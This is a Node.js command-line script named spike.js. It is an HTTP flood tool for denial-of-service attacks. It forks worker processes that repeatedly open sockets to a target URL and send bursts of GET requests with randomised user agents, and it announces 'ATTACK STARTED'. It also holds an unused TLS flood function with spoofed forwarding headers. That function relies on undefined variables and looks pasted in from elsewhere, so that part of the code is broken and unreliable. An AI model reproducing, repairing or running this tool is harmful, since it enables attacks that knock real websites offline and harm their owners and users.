const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

if (process.argv.length <= 3) {
  console.log('node spike.js <url> <threads> <time>');
  process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.host;
const threads = process.argv[3];
const time = process.argv[4];

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (error) {});
process.on('unhandledRejection', function (error) {});


function flood(){
    tls.authorized = true;
    tls.sync = true;
    var TlsConnection = tls.connect({
      ciphers: "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
      secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
      honorCipherOrder: true,
      requestCert: false,
      host: parsed.host,
      port: 443,
      secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
      servername: parsed.host,
      secure: true,
      rejectUnauthorized: false
    }, function () {
      for (let i = 0; i < process.argv[4]; i++) {
        TlsConnection.setKeepAlive(true, 10000)
        TlsConnection.setTimeout(10000);
        TlsConnection.write(`GET ${parsed.path}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + parsed.href + '\r\nOrigin: ' + parsed.href + '\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nX-Forwarded-For: ' + ip_spoofing() + `Cache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`);
      }
    }).on('disconnected', () => {
        TlsConnection.destroy();
        return delete TlsConnection
    }).on('timeout', () => {
        TlsConnection.destroy();
        return delete TlsConnection
    }).on('error', () => {
        TlsConnection.destroy();
        return delete TlsConnection
    }).on('data', () => {
        setTimeout(function () {
            TlsConnection.destroy();
            return delete TlsConnection
        }, 100020);
    }).on('end', () => {
        TlsConnection.destroy();
        return delete TlsConnection
    });
}

let userAgents = [];
try {
  userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (error) {
  console.error('\x1B[31mDSTATKurang file ua.txt blok\n' + error);
  process.exit(-1);
}

const nullHexs = ['\0', 'ÿ', 'Â', '\xA0'];

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  console.clear();
  console.log('\x1B[31mATTACK STARTED');
  setTimeout(() => {
    process.exit(1);
  }, time * 10000);
} else {
  startFlood();
}

function startFlood() {
  const interval = setInterval(() => {
    const socket = require('net').Socket();
    socket.connect(80, host);
    socket.setTimeout(10000);

    for (let i = 0; i < 64; i++) {
      socket.write(
        'GET ' +
          target +
          ' HTTP/1.1\r\nHost: ' +
          parsed.host +
          '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' +
          userAgents[Math.floor(Math.random() * userAgents.length)] +
          '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
      );
    }

    socket.on('data', function () {
      setTimeout(function () {
        return socket.destroy(), delete socket;
      }, 50000);
    });
  });

  setTimeout(() => clearInterval(interval), time * 10000);
}